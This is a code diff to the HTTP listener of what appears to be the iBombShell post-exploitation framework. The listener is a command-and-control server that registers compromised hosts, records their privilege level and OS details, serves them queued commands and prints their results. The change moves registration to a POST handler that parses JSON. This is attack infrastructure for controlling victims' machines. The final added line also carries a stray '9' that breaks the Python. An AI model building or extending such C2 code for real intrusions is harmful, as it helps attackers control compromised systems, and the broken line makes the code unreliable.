@@ -1,5 +1,6 @@
 import re
 import threading
+import json
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 from urllib.parse import parse_qs, unquote
@@ -31,18 +32,17 @@ class Listener(BaseHTTPRequestHandler):
 
     def do_GET(self):
         warrior_path = Config.get_instance().get_warrior_path() + "ibs-"
-        ipSrc = self.client_address[0]
         #regex = re.findall(r'^(.+)/([^/]+)$', self.path)
         regex = re.findall(r'^(.+)/([^/]+)$', self.path)
         route = ''
         try:
-            route = regex[0][0]
+            route = regex[0][0].strip('/')
             routeId = regex[0][1]
         except Exception:
             print_error('Error creating warrior...')
 
         a = ''
-        if route == "/ibombshell":
+        if route == "ibombshell":
             try:
                 with open('{}{}'.format(warrior_path, routeId), 'r') as f:
                     a = f.read()
@@ -56,21 +56,24 @@ class Listener(BaseHTTPRequestHandler):
                     Warrior.get_instance().review_status(routeId)
             except Exception:
                 print_error('Warrior {} don\'t found'.format(routeId), start="\n")
-        elif route == "/newibombshell":
-            if not Warrior.get_instance().exist_warrior(routeId):
-                with open('{}{}'.format(warrior_path, routeId), 'w') as f:
-                    f.write('')
-                print("")
-                print_ok ("New warrior {} from {}".format(routeId, ipSrc))
-                Warrior.get_instance().add_warrior(routeId, "", "", "", "")
-            else:
-                print_error('Warrior already exists!')
         
         self._set_response()
         #self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))
         self.wfile.write(a.encode('utf-8'))
 
     def do_POST(self):
+        warrior_path = Config.get_instance().get_warrior_path() + "ibs-"
+        ipSrc = self.client_address[0]
+
+        regex = re.findall(r'^(.+)/([^/]+)$', self.path)
+        route = ''
+        routeId = ''
+        try:
+            route = regex[0][0].strip('/')
+            routeId = regex[0][1]
+        except Exception:
+            print_error('Error creating warrior...')
+
         content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
         post_data = self.rfile.read(content_length) # <--- Gets the data itself
 
@@ -84,15 +87,26 @@ class Listener(BaseHTTPRequestHandler):
 
             if fields:
                 results = fields['results'][0]
+
                 try:
                     url = str(unquote(results))
-                    if url.startswith("custominfo"):
-                        data = url.split("\n")# Tratar datos del warrior!
-                        routeId = data[1]
-                        is_admin = False if data[2]=="no" else True
-                        os_version = data[3].strip("\r")
-                        os_arch = data[4].strip("\r")
-                        Warrior.get_instance().add_warrior(routeId, self.client_address[0], is_admin, os_version, os_arch)
+                    if route == "newibombshell" and routeId != '':
+
+                        if not Warrior.get_instance().exist_warrior(routeId):
+                            with open('{}{}'.format(warrior_path, routeId), 'w') as f:
+                                f.write('')
+                            print("")
+                            print_ok ("New warrior {} from {}".format(routeId, ipSrc))
+                            data = json.loads(url)
+                            print_info("Warrior %s sended info:" % routeId)
+                            for d in data:
+                                print_info('   %s => %s' % (d, data[d].strip('\r\n')))
+                            is_admin = data['admin'] != 'no'
+                            os_version = data['os_version'].strip('\r\n')
+                            os_arch = data['os_arch'].strip('\r\n')
+                            Warrior.get_instance().add_warrior(routeId, self.client_address[0], is_admin, os_version, os_arch)
+                        else:
+                            print_error('Warrior already exists!')
                     else:
                         for result in url.split("\\n"):
                             print_info (result)
@@ -140,4 +154,4 @@ class CustomModule(Module):
         except KeyboardInterrupt:
             pass
         httpd.server_close()
-        print_info('Stopping listener...')
+        print_info('Stopping listener...')9
